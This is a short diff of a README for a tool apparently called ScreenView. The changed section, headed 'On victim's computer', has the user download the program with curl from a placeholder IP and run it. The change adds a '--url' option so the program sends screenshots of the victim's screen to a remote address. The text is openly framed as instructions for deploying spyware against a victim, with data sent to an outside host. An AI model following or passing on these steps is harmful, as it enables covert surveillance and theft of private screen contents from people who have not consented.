@@ -25,7 +25,7 @@ $ pip3 install -r requirements.txt
 ### On victim's computer
 ```
 $ curl http://IP/ScreenView/ScreenView.(exe, app, etc) --output ScreenView.(exe, app, etc)
-$ ScreenView.(exe, app, etc) --time (time in minutes to view the victim's screen)
+$ ScreenView.(exe, app, etc) --time (# Minutes) --url (Url to send screenshot to)
 ```
 
 ## Compilation
